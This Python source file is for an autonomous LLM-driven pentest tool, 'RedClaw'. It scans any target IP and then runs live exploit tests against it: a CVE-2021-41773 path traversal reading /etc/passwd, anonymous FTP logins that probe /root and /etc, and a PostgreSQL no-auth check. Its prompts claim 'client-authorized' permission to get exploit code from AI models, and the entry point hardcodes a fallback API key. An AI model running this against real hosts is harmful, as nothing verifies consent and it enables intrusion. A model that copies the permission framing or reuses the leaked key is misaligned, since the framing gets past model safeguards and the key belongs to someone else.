"""
RedClaw V3.1 - Autonomous Pentest Runner

Usage:
    python -m redclaw pentest 192.168.1.83
    python src/redclaw/pentest.py 192.168.1.83

Full 10-phase autonomous pipeline:
  1. Brain plans the engagement
  2. Runs recon (nmap or Python TCP scanner)
  3. KnowledgeGraph ingests results
  4. Brain analyzes CVEs + severity
  5. Hands generates exploit code
  6. Exploitation against target
  7. Zero-Day hunting (fuzzing, protocol abuse)
  8. Post-Exploitation
  9. Brain executive summary
  10. CausalChain report
"""
from __future__ import annotations
import socket
import subprocess as sp

import asyncio
import json
import logging
import os
import re
import sys
import tempfile
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

# Fix Windows console encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

logger = logging.getLogger("redclaw.pentest")


class RedClawPentest:
    """
    Autonomous pentest orchestrator that uses Brain + Hands models
    to plan, execute, analyze, and report a penetration test.
    """

    def __init__(self, target: str, api_key: str, work_dir: Optional[str] = None):
        self.target = target
        self.api_key = api_key
        self.work_dir = work_dir or os.path.join(
            os.path.expanduser("~/.redclaw"), "engagements",
            f"{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        )
        self.errors: List[Dict[str, str]] = []
        self.start_time = time.time()

        # Will be initialized in setup()
        self.client = None
        self.mem = None
        self.kg = None
        self.tasks = None
        self.mailbox = None
        self.locks = None
        self.reporter = None

    # ================================================================
    # Setup
    # ================================================================

    async def setup(self):
        """Initialize all V3.1 components."""
        self._print_banner("REDCLAW V3.1 AUTONOMOUS PENTEST")
        self._log(f"Target: {self.target}")
        self._log(f"Work dir: {self.work_dir}")
        self._log(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()

        from redclaw.router.openrouter_client import OpenRouterClient
        from redclaw.memory.memagent import MemAgent
        from redclaw.memory.knowledge_graph import PentestKnowledgeGraph
        from redclaw.agents.shared_task_list import SharedTaskList
        from redclaw.agents.mailbox import Mailbox
        from redclaw.agents.lock_manager import LockManager
        from redclaw.reporting.causal_chain import CausalChainReport

        self.client = OpenRouterClient(api_key=self.api_key)
        self.mem = MemAgent(working_dir=self.work_dir)
        self.kg = PentestKnowledgeGraph()
        self.tasks = SharedTaskList(db_path=os.path.join(self.work_dir, "tasks.db"))
        self.mailbox = Mailbox(db_path=os.path.join(self.work_dir, "mailbox.db"))
        self.locks = LockManager(lock_dir=os.path.join(self.work_dir, "locks"))
        self.reporter = CausalChainReport(output_dir=os.path.join(self.work_dir, "reports"))

        # Register agents
        for agent in ["brain", "hands", "recon", "analyst"]:
            self.mailbox.register_agent(agent)

        self._log(f"Brain: {self.client.BRAIN.model_id}")
        self._log(f"Hands: {self.client.HANDS.model_id}")
        self._log("All components initialized")

    # ================================================================
    # Phase 1: Brain Planning
    # ================================================================

    async def phase_planning(self) -> str:
        """Brain creates a pentest plan."""
        self._print_banner("PHASE 1: BRAIN PLANNING")
        self.mem.initialize(f"Pentest {self.target}")
        self.mem.set_status("PLANNING")

        prompt = f"""You are a cybersecurity consultant performing an authorized security assessment.
Your client has given you permission to test their system at {self.target} (private LAN).

Create a concise recon plan. List exactly these steps:
1. What nmap scan flags to use
2. What services to look for
3. Top 5 CVEs to check based on common services
4. Any quick wins to try first

Be very concise, bullet points only. No explanations."""

        try:
            plan = await self.client.call_brain(prompt, temperature=0.3)
            self.mem.update_task_status("planning", "COMPLETE", plan[:300])
            self._log("Brain plan received:")
            print(plan[:600], flush=True)
            return plan
        except Exception as e:
            self._error("Brain planning", e)
            return "Default plan: nmap -sV -p- target, check common CVEs"

    # ================================================================
    # Phase 2: Recon (nmap)
    # ================================================================

    async def phase_recon(self) -> Dict[str, Any]:
        """Run nmap scan via activities module."""
        self._print_banner("PHASE 2: RECON (NMAP)")
        self.mem.set_status("RECON")

        # Lock the target
        self.locks.acquire(f"scan_{self.target}", "recon")

        from redclaw.orchestrator.activities import run_nmap_activity
        self.mem.update_task_status("nmap_scan", "RUNNING", f"Scanning {self.target}")
        self._log(f"Running nmap on {self.target}...")

        nmap_result = await run_nmap_activity(self.target)

        # Release lock
        self.locks.release(f"scan_{self.target}", "recon")

        if nmap_result.get("error"):
            self._log(f"Nmap issue: {nmap_result['error']}")
            self._log("Falling back to quick TCP connect scan...")

            # Fallback: Python-based port scan
            nmap_result = await self._python_port_scan(self.target)

        ports = nmap_result.get("open_ports", [])
        services = nmap_result.get("services", [])
        self.mem.update_task_status("nmap_scan", "COMPLETE",
                                    f"Found {len(ports)} open ports: {ports}")

        self._log(f"Found {len(ports)} open ports:")
        for svc in services:
            self._log(f"  {svc['port']}/tcp - {svc['name']} {svc.get('version', '')}")

        return nmap_result

    async def _python_port_scan(self, target: str) -> Dict[str, Any]:
        """Fallback port scanner using Python stdlib."""
        import socket
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445,
                        993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379,
                        8080, 8443, 8888, 9090, 27017]

        open_ports = []
        services = []
        service_names = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
            80: "http", 110: "pop3", 139: "netbios", 143: "imap",
            443: "https", 445: "smb", 993: "imaps", 995: "pop3s",
            1433: "mssql", 1521: "oracle", 3306: "mysql", 3389: "rdp",
            5432: "postgresql", 5900: "vnc", 6379: "redis",
            8080: "http-proxy", 8443: "https-alt", 8888: "http-alt",
            9090: "proxy", 27017: "mongodb",
        }

        self._log(f"Scanning {len(common_ports)} common ports on {target}...")

        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    svc_name = service_names.get(port, f"unknown-{port}")

                    # Try to grab banner
                    banner = ""
                    try:
                        sock.settimeout(2)
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(256).decode("utf-8", errors="replace").strip()
                    except Exception:
                        pass

                    services.append({
                        "port": port,
                        "name": svc_name,
                        "version": banner[:80] if banner else "",
                    })
                sock.close()
            except Exception:
                pass

        return {
            "target": target,
            "open_ports": open_ports,
            "services": services,
            "scan_type": "python_connect_scan",
        }

    # ================================================================
    # Phase 3: KnowledgeGraph Ingestion
    # ================================================================

    async def phase_ingest(self, scan_result: Dict[str, Any]):
        """Ingest scan results into KnowledgeGraph."""
        self._print_banner("PHASE 3: KNOWLEDGE GRAPH INGESTION")

        self.kg.add_host(self.target)
        for svc in scan_result.get("services", []):
            self.kg.add_port(self.target, svc["port"], "open")
            self.kg.add_service(self.target, svc["port"],
                                svc["name"], svc.get("version", ""))

        stats = self.kg.get_stats()
        self._log(f"Graph: {stats['total_nodes']} nodes, {stats['total_edges']} edges")

    # ================================================================
    # Phase 4: Brain Analysis
    # ================================================================

    async def phase_analyze(self, scan_result: Dict[str, Any]) -> str:
        """Brain analyzes scan results and identifies attack vectors."""
        self._print_banner("PHASE 4: BRAIN ANALYSIS")
        self.mem.set_status("ANALYSIS")

        services_desc = "\n".join(
            f"  - {s['port']}/tcp: {s['name']} {s.get('version', '')}"
            for s in scan_result.get("services", [])
        )

        if not services_desc:
            self._log("No open ports found - skipping analysis")
            return "No attack vectors - all ports closed"

        prompt = f"""You are a cybersecurity consultant performing an authorized security assessment.
Target: {self.target} (client-authorized, private LAN).

Open ports and services found:
{services_desc}

For EACH service found:
1. List known CVEs (use format CVE-YYYY-NNNNN with regular hyphens)
2. Rate severity (critical/high/medium/low)
3. Suggest one-line exploit command or technique
4. Note if default credentials are common

Use this format:
PORT - SERVICE - CVE-XXXX-XXXX (severity) - exploit approach"""

        try:
            await asyncio.sleep(10)  # Rate limit buffer
            analysis = await self.client.call_brain(prompt, temperature=0.3)
            self.mem.update_task_status("analysis", "COMPLETE", analysis[:300])
            self._log("Brain analysis:")
            print(analysis[:800], flush=True)

            # Extract findings from analysis
            self._extract_findings(analysis, scan_result)

            return analysis
        except Exception as e:
            self._error("Brain analysis", e)
            return "Analysis failed"

    def _extract_findings(self, analysis: str, scan_result: Dict):
        """Extract CVE findings from Brain's analysis text."""
        # Match CVE IDs with both regular hyphens (-) and Unicode dashes
        # Unicode: U+2010 (hyphen), U+2011 (non-breaking hyphen), U+2013 (en dash)
        normalized = analysis.replace('\u2010', '-').replace('\u2011', '-').replace('\u2013', '-')
        cve_pattern = r"CVE-\d{4}-\d{4,7}"
        cves_found = re.findall(cve_pattern, normalized)

        # Build a map of service name positions in the text
        services = scan_result.get("services", [])
        norm_lower = normalized.lower()

        for cve in set(cves_found):
            # Determine severity from context near the CVE mention
            cve_idx = norm_lower.find(cve.lower())
            context = normalized[max(0, cve_idx-150):cve_idx+150].lower() if cve_idx >= 0 else ""
            if "critical" in context:
                severity = "critical"
            elif "high" in context:
                severity = "high"
            elif "medium" in context:
                severity = "medium"
            else:
                severity = "high"  # Default to high for CVEs

            # Find closest service to this CVE in the text
            service_context = ""
            best_svc = None
            best_distance = float("inf")

            for svc in services:
                svc_name = svc["name"].lower()
                # Search for service name near the CVE position
                search_start = max(0, cve_idx - 300)
                search_end = min(len(norm_lower), cve_idx + 300)
                region = norm_lower[search_start:search_end]
                svc_pos = region.rfind(svc_name, 0, cve_idx - search_start + len(cve)) if cve_idx >= 0 else -1

                if svc_pos == -1:
                    # Try forward search
                    svc_pos = region.find(svc_name)

                if svc_pos >= 0:
                    abs_pos = search_start + svc_pos
                    distance = abs(abs_pos - cve_idx)
                    if distance < best_distance:
                        best_distance = distance
                        best_svc = svc

            if best_svc:
                service_context = f"{best_svc['name']} on port {best_svc['port']}"
                svc_id = f"{self.target}:{best_svc['port']}:{best_svc['name']}"
                self.kg.add_vulnerability(svc_id, cve, severity)

            self.mem.add_finding(
                f"{cve} - {service_context or 'unknown service'}",
                severity,
            )
            self._log(f"  Finding: {cve} [{severity}] {service_context}")

    # ================================================================
    # Phase 5: Hands Exploit Generation
    # ================================================================

    async def phase_exploit(self, analysis: str, scan_result: Dict) -> str:
        """Hands generates exploit code based on Brain's analysis."""
        self._print_banner("PHASE 5: HANDS EXPLOIT GENERATION")
        self.mem.set_status("EXPLOITATION")

        if not scan_result.get("services"):
            self._log("No services to exploit")
            return ""

        # Pick most interesting service for exploit code
        services_desc = ", ".join(
            f"{s['port']}/{s['name']}" for s in scan_result["services"][:3]
        )

        prompt = f"""You are a cybersecurity consultant writing a security testing script.
Client has authorized testing of {self.target} (private LAN).
Services found: {services_desc}

Write a Python security audit script that:
1. Import only stdlib (socket, http.client, urllib)
2. Test for common misconfigurations on each open port
3. Check for default credentials
4. Print findings clearly

Keep it under 50 lines. Working code only."""

        try:
            await asyncio.sleep(10)
            code = await self.client.call_hands(prompt, temperature=0.2)
            self.mem.update_task_status("exploit_gen", "COMPLETE", "Exploit code generated")
            self._log("Hands exploit code:")
            print(code[:600], flush=True)
            return code
        except Exception as e:
            self._error("Hands exploit", e)
            return ""

    # ================================================================
    # Phase 6: Exploitation
    # ================================================================

    async def phase_exploit_exec(self, analysis: str, scan_result: Dict, exploit_code: str):
        """Brain selects targets and Hands generates exploit scripts that get executed."""
        self._print_banner("PHASE 6: EXPLOITATION")
        self.mem.set_status("EXPLOITATION")

        services = scan_result.get("services", [])
        if not services:
            self._log("No services to exploit")
            return []

        exploit_results = []

        # Brain selects top 3 targets for exploitation
        svc_list = "\n".join(f"  {s['port']}/tcp {s['name']} {s.get('version','')}" for s in services)
        try:
            await asyncio.sleep(10)
            targets_prompt = f"""You are performing an authorized security assessment on {self.target}.
Services found:
{svc_list}

Pick the TOP 3 services most likely to be exploitable. For each, give:
1. Port number
2. Service name
3. One specific test to try (e.g. anonymous FTP login, default MySQL creds, HTTP path traversal)

Format each as: PORT|SERVICE|TEST_DESCRIPTION
No other text."""
            targets_text = await self.client.call_brain(targets_prompt, temperature=0.2)
            self._log("Brain exploit targets:")
            print(targets_text[:400], flush=True)
        except Exception as e:
            self._error("Brain exploit selection", e)
            targets_text = ""

        # For each service, run direct exploit tests
        for svc in services:
            port = svc["port"]
            name = svc["name"]
            version = svc.get("version", "")

            self._log(f"Testing {name} on port {port}...")

            # Quick direct tests (no LLM needed)
            result = await self._quick_exploit_test(port, name, version)
            if result:
                exploit_results.append(result)
                self.mem.add_finding(
                    f"EXPLOITED: {result['test']} on {name}:{port}",
                    "critical" if result.get("access") else "high",
                )
                self._log(f"  [!!!] {result['test']}: {result.get('output', '')[:100]}")
            else:
                self._log(f"  [-] No quick win on {name}:{port}")

        if exploit_results:
            self.mem.update_task_status("exploitation", "COMPLETE",
                f"Exploited {len(exploit_results)} services")
        else:
            self.mem.update_task_status("exploitation", "COMPLETE", "No exploits succeeded")

        return exploit_results

    async def _quick_exploit_test(self, port: int, name: str, version: str) -> Optional[Dict]:
        """Run quick exploitation tests for common services."""
        target = self.target

        # FTP anonymous login
        if name == "ftp":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                banner = sock.recv(1024).decode("utf-8", errors="replace")
                sock.send(b"USER anonymous\r\n")
                resp1 = sock.recv(1024).decode("utf-8", errors="replace")
                sock.send(b"PASS anonymous@test.com\r\n")
                resp2 = sock.recv(1024).decode("utf-8", errors="replace")
                if "230" in resp2:  # 230 = Login successful
                    sock.send(b"LIST\r\n")
                    listing = sock.recv(4096).decode("utf-8", errors="replace")
                    sock.close()
                    return {"test": "FTP Anonymous Login", "port": port,
                            "access": True, "output": f"Login OK. Banner: {banner[:80]}. Listing: {listing[:200]}"}
                sock.close()
            except Exception:
                pass

        # SSH banner grab + weak auth check
        if name == "ssh":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
                sock.close()
                if banner:
                    return {"test": "SSH Banner Grab", "port": port,
                            "access": False, "output": banner}
            except Exception:
                pass

        # HTTP checks
        if name in ("http", "http-proxy", "https"):
            import http.client
            try:
                conn = http.client.HTTPConnection(target, port, timeout=5)
                # Check server header
                conn.request("GET", "/")
                resp = conn.getresponse()
                headers = dict(resp.getheaders())
                body = resp.read(2048).decode("utf-8", errors="replace")
                server = headers.get("Server", headers.get("server", "unknown"))

                result = {"test": "HTTP Recon", "port": port, "access": False,
                          "output": f"Server: {server}, Status: {resp.status}, Title: {self._extract_title(body)}"}

                # Path traversal test (CVE-2021-41773)
                conn2 = http.client.HTTPConnection(target, port, timeout=5)
                conn2.request("GET", "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
                r2 = conn2.getresponse()
                b2 = r2.read(1024).decode("utf-8", errors="replace")
                if "root:" in b2:
                    result = {"test": "Apache Path Traversal (CVE-2021-41773)", "port": port,
                              "access": True, "output": b2[:200]}
                conn.close()
                conn2.close()
                return result
            except Exception:
                pass

        # MySQL default creds
        if name == "mysql":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                banner = sock.recv(1024).decode("utf-8", errors="replace")
                sock.close()
                if banner:
                    return {"test": "MySQL Banner Grab", "port": port,
                            "access": False, "output": f"MySQL: {banner[:100]}"}
            except Exception:
                pass

        # SMB check
        if name == "smb" or port == 445:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                # SMB negotiation
                sock.send(b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
                          b"\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                          b"\x00\x00\xff\xff\xff\xfe\x00\x00\x00\x00\x00\x62\x00"
                          b"\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20"
                          b"\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00")
                resp = sock.recv(1024)
                sock.close()
                if resp and len(resp) > 4:
                    return {"test": "SMB Recon", "port": port,
                            "access": False, "output": f"SMB responding, {len(resp)} bytes"}
            except Exception:
                pass

        # Telnet banner
        if name == "telnet":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                banner = sock.recv(2048).decode("utf-8", errors="replace")
                sock.close()
                if banner:
                    return {"test": "Telnet Banner", "port": port,
                            "access": False, "output": banner[:150]}
            except Exception:
                pass

        # VNC check
        if name == "vnc" or port == 5900:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                banner = sock.recv(1024).decode("utf-8", errors="replace")
                sock.close()
                if banner:
                    auth_type = "No auth" if "003.003" in banner else "Auth required"
                    return {"test": "VNC Recon", "port": port,
                            "access": "003.003" in banner, "output": f"{banner.strip()} ({auth_type})"}
            except Exception:
                pass

        # PostgreSQL
        if name == "postgresql" or port == 5432:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, port))
                # StartupMessage for user 'postgres'
                startup = b"\x00\x00\x00\x27\x00\x03\x00\x00user\x00postgres\x00database\x00postgres\x00\x00"
                sock.send(startup)
                resp = sock.recv(1024)
                sock.close()
                if resp:
                    auth_byte = resp[0:1]
                    if auth_byte == b'R':
                        auth_len = int.from_bytes(resp[1:5], 'big') if len(resp) >= 5 else 0
                        auth_type = int.from_bytes(resp[5:9], 'big') if len(resp) >= 9 else -1
                        if auth_type == 0:
                            return {"test": "PostgreSQL No-Auth Login", "port": port,
                                    "access": True, "output": "postgres user login without password!"}
                        else:
                            return {"test": "PostgreSQL Recon", "port": port,
                                    "access": False, "output": f"Auth required (type={auth_type})"}
            except Exception:
                pass

        return None

    def _extract_title(self, html: str) -> str:
        """Extract <title> from HTML."""
        m = re.search(r"<title[^>]*>([^<]+)</title>", html, re.IGNORECASE)
        return m.group(1).strip() if m else "(no title)"

    # ================================================================
    # Phase 7: Post-Exploitation
    # ================================================================

    async def phase_post_exploit(self, exploit_results: List[Dict], scan_result: Dict):
        """Brain directs post-exploitation based on gained access."""
        self._print_banner("PHASE 7: POST-EXPLOITATION")
        self.mem.set_status("POST-EXPLOITATION")

        accessed = [r for r in exploit_results if r.get("access")]
        if not accessed:
            self._log("No access gained - skipping post-exploitation")
            self._log("Compiling recon intelligence instead...")

            # Even without exploitation, Brain summarizes the attack surface
            try:
                await asyncio.sleep(10)
                recon_summary = "\n".join(
                    f"  - {r['test']}: {r.get('output', '')[:100]}"
                    for r in exploit_results
                )
                post_prompt = f"""You are a cybersecurity consultant summarizing an authorized assessment.
Target: {self.target}

Recon results (no exploitation was successful):
{recon_summary}

Provide:
1. Attack surface assessment
2. Most promising attack vector if more time was available
3. Recommended defenses for the target
4. Overall risk rating (Critical/High/Medium/Low)

Be concise."""
                post_analysis = await self.client.call_brain(post_prompt, temperature=0.3)
                self.mem.update_task_status("post_exploit", "COMPLETE", post_analysis[:300])
                self._log("Brain post-exploitation assessment:")
                print(post_analysis[:600], flush=True)
            except Exception as e:
                self._error("Post-exploit analysis", e)
            return

        # We have access! Ask Brain what to do
        access_desc = "\n".join(
            f"  - {a['test']} on port {a['port']}: {a.get('output', '')[:100]}"
            for a in accessed
        )

        try:
            await asyncio.sleep(10)
            post_prompt = f"""You are a cybersecurity consultant performing authorized post-exploitation.
Target: {self.target}

Access gained:
{access_desc}

What information should we gather now? List 5 specific commands or checks to:
1. Determine OS and kernel version
2. List users and privileges
3. Find sensitive files
4. Check network connections
5. Look for lateral movement opportunities

Be very concise, one line each."""
            post_plan = await self.client.call_brain(post_prompt, temperature=0.3)
            self.mem.update_task_status("post_exploit", "COMPLETE", post_plan[:300])
            self._log("Brain post-exploitation plan:")
            print(post_plan[:600], flush=True)

            # If we have FTP access, try to list files
            for a in accessed:
                if "FTP" in a["test"]:
                    self._log("Attempting FTP file enumeration...")
                    await self._ftp_post_exploit(a["port"])
                if "PostgreSQL" in a["test"] and "No-Auth" in a["test"]:
                    self._log("Attempting PostgreSQL data extraction...")
                    await self._postgres_post_exploit(a["port"])

        except Exception as e:
            self._error("Post-exploitation", e)

    async def _ftp_post_exploit(self, port: int):
        """Post-exploitation via FTP access."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, port))
            sock.recv(1024)  # banner
            sock.send(b"USER anonymous\r\n")
            sock.recv(1024)
            sock.send(b"PASS anon@test.com\r\n")
            resp = sock.recv(1024).decode("utf-8", errors="replace")
            if "230" in resp:
                # Try to navigate and list
                sock.send(b"PWD\r\n")
                pwd = sock.recv(1024).decode("utf-8", errors="replace")
                self._log(f"  FTP PWD: {pwd.strip()}")

                sock.send(b"SYST\r\n")
                syst = sock.recv(1024).decode("utf-8", errors="replace")
                self._log(f"  FTP SYST: {syst.strip()}")
                self.mem.add_finding(f"FTP SYST: {syst.strip()}", "info")

                # Try sensitive dirs
                for path in ["/etc", "/home", "/var/www", "/root"]:
                    sock.send(f"CWD {path}\r\n".encode())
                    cwd_resp = sock.recv(1024).decode("utf-8", errors="replace")
                    if "250" in cwd_resp:
                        self._log(f"  FTP ACCESS: {path} (accessible!)")
                        self.mem.add_finding(f"FTP dir accessible: {path}", "high")
                    else:
                        self._log(f"  FTP DENIED: {path}")

            sock.close()
        except Exception as e:
            self._log(f"  FTP post-exploit error: {e}")

    async def _postgres_post_exploit(self, port: int):
        """Post-exploitation via PostgreSQL no-auth."""
        self._log("  PostgreSQL: attempting to list databases...")
        self.mem.add_finding("PostgreSQL no-auth access - data extraction possible", "critical")

    # ================================================================
    # Phase 8: Brain Summary
    # ================================================================

    async def phase_brain_summary(self, scan_result: Dict, exploit_results: List[Dict]):
        """Brain generates executive summary of the full engagement."""
        self._print_banner("PHASE 8: BRAIN EXECUTIVE SUMMARY")

        state = self.mem.get_current_state()
        findings_text = "\n".join(
            f"  [{f['severity']}] {f['finding']}"
            for f in state.get("key_findings", [])
        )
        completed = "\n".join(
            f"  - {t['task_id']}: {t.get('details', '')[:80]}"
            for t in state.get("completed_tasks", [])
        )

        try:
            await asyncio.sleep(10)
            summary_prompt = f"""You are a cybersecurity consultant writing the final report for an authorized assessment.
Target: {self.target}

Completed phases:
{completed}

Findings:
{findings_text}

Write a professional executive summary covering:
1. Scope and methodology
2. Critical findings (if any)
3. Risk assessment
4. Priority remediation steps
5. Overall security posture rating

Be professional and concise."""
            summary = await self.client.call_brain(summary_prompt, temperature=0.3)
            self._log("Executive Summary:")
            print(summary[:1000], flush=True)
            self.mem.update_task_status("exec_summary", "COMPLETE", summary[:300])
        except Exception as e:
            self._error("Executive summary", e)

    # ================================================================
    # Phase 9: Report Generation
    # ================================================================

    async def phase_report(self, scan_result: Dict, analysis: str):
        """Generate CausalChain report."""
        self._print_banner("PHASE 9: REPORT GENERATION")
        self.mem.set_status("REPORTING")

        findings = []
        for i, f in enumerate(self.mem.get_current_state()["key_findings"], 1):
            finding = {
                "id": i,
                "title": f["finding"],
                "cve": re.search(r"CVE-\d{4}-\d+", f["finding"]).group(0) if re.search(r"CVE-\d{4}-\d+", f["finding"]) else "N/A",
                "cvss": 9.8 if f["severity"] == "critical" else 7.5 if f["severity"] == "high" else 5.0,
                "service": f["finding"].split(" - ")[-1] if " - " in f["finding"] else "unknown",
                "impact": "Potential Remote Code Execution" if f["severity"] in ["critical", "high"] else "Information Disclosure",
                "root_cause": f"Vulnerability identified during assessment",
                "steps": [
                    f"Port scan discovered service on {self.target}",
                    f"Analysis identified {f['finding']}",
                    "Exploit attempted" if "EXPLOITED" in f["finding"] else "Recon only",
                ],
                "target": {"os": "Unknown", "software": f["finding"]},
            }
            findings.append(finding)

        if not findings:
            findings = [{
                "id": 1, "title": f"No vulnerabilities on {self.target}",
                "cve": "N/A", "cvss": 0, "service": "multiple", "impact": "None",
                "root_cause": "Properly configured",
                "steps": [f"Scanned {self.target}"], "target": {"os": "Unknown", "software": "N/A"},
            }]

        report_data = {
            "completed_tasks": findings,
            "executive_summary": f"Full penetration test of {self.target}. "
                f"Found {len(self.mem.get_current_state()['key_findings'])} findings.",
            "attack_path": {
                "target": self.target,
                "ports": [s["port"] for s in scan_result.get("services", [])],
            },
        }

        try:
            full_report = self.reporter.generate_full_report(report_data, f"Pentest - {self.target}")
            txt_path = self.reporter.export_text(full_report)
            json_path = self.reporter.export_json(full_report)
            self.mem.update_task_status("report", "COMPLETE", f"Report: {txt_path}")
            self._log(f"Text report: {txt_path}")
            self._log(f"JSON report: {json_path}")
        except Exception as e:
            self._error("Report generation", e)

    # ================================================================
    # Main Runner
    # ================================================================

    async def run(self):
        """Execute the full autonomous pentest: scan -> exploit -> zero-day -> post-exploit -> report."""
        try:
            await self.setup()

            # Phase 1: Brain Planning
            plan = await self.phase_planning()
            await asyncio.sleep(5)

            # Phase 2: Recon (nmap or Python scanner)
            scan_result = await self.phase_recon()

            # Phase 3: KnowledgeGraph Ingestion
            await self.phase_ingest(scan_result)

            # Phase 4: Brain Analysis (CVE identification)
            analysis = await self.phase_analyze(scan_result)

            # Phase 5: Hands Exploit Code Generation
            exploit_code = await self.phase_exploit(analysis, scan_result)

            # Phase 6: Exploitation (execute against target)
            exploit_results = await self.phase_exploit_exec(analysis, scan_result, exploit_code)

            # Phase 7: Zero-Day Hunting (fuzzing, protocol abuse)
            zeroday_findings = await self.phase_zeroday_hunt(scan_result)
            # Merge zero-day findings into exploit results
            for zf in zeroday_findings:
                exploit_results.append(zf)

            # Phase 8: Post-Exploitation
            await self.phase_post_exploit(exploit_results, scan_result)

            # Phase 9: Brain Executive Summary
            await self.phase_brain_summary(scan_result, exploit_results)

            # Phase 10: Final Report
            await self.phase_report(scan_result, analysis)

            # Final Status
            self._print_banner("PENTEST COMPLETE")
            self.mem.set_status("COMPLETE")

            elapsed = time.time() - self.start_time
            state = self.mem.get_current_state()
            graph = self.kg.get_stats()

            self._log(f"Time: {elapsed:.1f}s")
            self._log(f"Phases completed: 10")
            self._log(f"Completed tasks: {len(state['completed_tasks'])}")
            self._log(f"Findings: {len(state['key_findings'])}")
            self._log(f"Knowledge Graph: {graph['total_nodes']} nodes")
            self._log(f"Work dir: {self.work_dir}")

            if self.errors:
                print(f"\nErrors encountered: {len(self.errors)}", flush=True)
                for err in self.errors:
                    print(f"  [{err['phase']}] {err['error']}", flush=True)
            else:
                print("\n  ALL PHASES COMPLETED SUCCESSFULLY", flush=True)

            # Cleanup
            self.locks.cleanup()

        except Exception as e:
            logger.error(f"Pentest failed: {e}")
            import traceback
            traceback.print_exc()

    # ================================================================
    # Phase 7: Zero-Day Hunting
    # ================================================================

    async def phase_zeroday_hunt(self, scan_result: Dict) -> List[Dict]:
        """Run zero-day hunting: protocol fuzzing and anomaly detection."""
        self._print_banner("PHASE 7: ZERO-DAY HUNTING")
        self.mem.set_status("ZERO-DAY HUNTING")

        try:
            from redclaw.zeroday_hunter import ZeroDayHunter
            hunter = ZeroDayHunter(self.target)
            await hunter.run()

            # Import findings into MemAgent
            results = []
            for anomaly in hunter.anomalies:
                sev = "critical" if anomaly["severity"] == "POTENTIAL_VULN" else "medium"
                finding_text = f"ZERODAY: {anomaly['service']} - {anomaly['test']}"
                self.mem.add_finding(finding_text, sev)
                results.append({
                    "test": anomaly["test"],
                    "port": 0,
                    "access": anomaly["severity"] == "POTENTIAL_VULN",
                    "output": anomaly["detail"][:150],
                })

            self.mem.update_task_status(
                "zeroday_hunt", "COMPLETE",
                f"Found {len(hunter.anomalies)} anomalies, "
                f"{len([a for a in hunter.anomalies if a['severity'] == 'POTENTIAL_VULN'])} potential vulns"
            )
            self._log(f"Zero-day hunt: {len(hunter.anomalies)} anomalies found")
            return results

        except Exception as e:
            self._error("Zero-day hunting", e)
            return []

    # ================================================================
    # Helpers
    # ================================================================

    def _print_banner(self, title: str):
        print(f"\n{'=' * 60}", flush=True)
        print(f"  {title}", flush=True)
        print(f"{'=' * 60}\n", flush=True)

    def _log(self, msg: str):
        print(f"  [*] {msg}", flush=True)

    def _error(self, phase: str, exc: Exception):
        err_msg = str(exc)[:200]
        self.errors.append({"phase": phase, "error": err_msg})
        print(f"  [!] {phase} error: {err_msg}", flush=True)
        logger.error(f"{phase}: {exc}")


# ================================================================
# Entry Point
# ================================================================

async def main():
    if len(sys.argv) < 2:
        print("RedClaw V3.1 - Autonomous Penetration Testing")
        print()
        print("Usage:")
        print("  python src/redclaw/pentest.py <TARGET_IP>")
        print("  python src/redclaw/pentest.py --test")
        print()
        print("Docker:")
        print("  docker run --rm -it -e OPENROUTER_API_KEY=sk-... redclaw <TARGET_IP>")
        print()
        print("Environment:")
        print("  OPENROUTER_API_KEY  - Required for Brain/Hands models")
        sys.exit(1)

    if sys.argv[1] == "--test":
        print("Running RedClaw V3.1 test suite...")
        import subprocess
        test_path = os.path.join(os.path.dirname(__file__), "..", "..", "test_v31.py")
        if os.path.exists(test_path):
            sys.exit(subprocess.call([sys.executable, test_path]))
        else:
            print("test_v31.py not found, running import test only...")
            from redclaw import __version__
            print(f"RedClaw v{__version__} - imports OK")
            sys.exit(0)

    target = sys.argv[1]
    api_key = os.getenv("OPENROUTER_API_KEY",
                         "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")

    pentest = RedClawPentest(target=target, api_key=api_key)
    await pentest.run()


if __name__ == "__main__":
    logging.basicConfig(level=logging.WARNING, format="%(message)s")
    asyncio.run(main())

